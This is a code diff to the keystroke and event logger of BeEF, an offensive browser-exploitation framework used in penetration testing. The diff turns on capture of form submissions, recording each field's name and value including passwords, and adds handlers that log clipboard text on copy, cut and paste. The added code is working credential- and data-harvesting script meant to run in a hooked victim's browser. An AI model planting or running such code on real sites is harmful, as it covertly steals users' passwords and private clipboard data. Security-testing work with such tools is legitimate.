@@ -58,9 +58,11 @@ beef.logger = {
 	 * Starts the logger
 	 */
 	start: function() {
+
 		this.running = true;
 		var d = new Date();
 		this.time = d.getTime();
+
 		$j(document).keypress(
 			function(e) { beef.logger.keypress(e); }
 		).click(
@@ -71,9 +73,18 @@ beef.logger = {
 		).blur(
 			function(e) { beef.logger.win_blur(e); }
 		);
-		/*$j('form').submit(
+		$j('form').submit(
 			function(e) { beef.logger.submit(e); }
-		);*/
+		);
+		document.body.oncopy = function() {
+			setTimeout("beef.logger.copy();", 10);
+		}
+		document.body.oncut = function() {
+			setTimeout("beef.logger.cut();", 10);
+		}
+		document.body.onpaste = function() {
+			beef.logger.paste();
+		}
 	},
 	
 	/**
@@ -137,11 +148,57 @@ beef.logger = {
 	},
 	
 	/**
-	 * Is called whenever a form is submitted
+	 * Copy function fires when the user copies data to the clipboard.
+	 */
+	copy: function(x) {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'copy';
+			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+	/**
+	 * Cut function fires when the user cuts data to the clipboard.
+	 */
+	cut: function() {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'cut';
+			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+	/**
+	 * Paste function fires when the user pastes data from the clipboard.
+	 */
+	paste: function() {
+		try {
+			var c = new beef.logger.e();
+			c.type = 'paste';
+			c.data = clipboardData.getData("Text");
+			this.events.push(c);
+		} catch(e) {}
+	},
+
+	/**
+	 * Submit function fires whenever a form is submitted
      * TODO: Cleanup this function
 	 */
 	submit: function(e) {
-		/*this.events.push('Form submission: Action: '+$j(e.target).attr('action')+' Method: '+$j(e.target).attr('method')+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target));*/
+		try {
+			var f = new beef.logger.e();
+			var values = "";
+			f.type = 'submit';
+			f.target = beef.logger.get_dom_identifier(e.target);
+			for (var i = 0; i < e.target.elements.length; i++) {
+	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
+	        }
+			f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
+			this.events.push(f);
+		} catch(e) {}
 	},
 	
 	/**
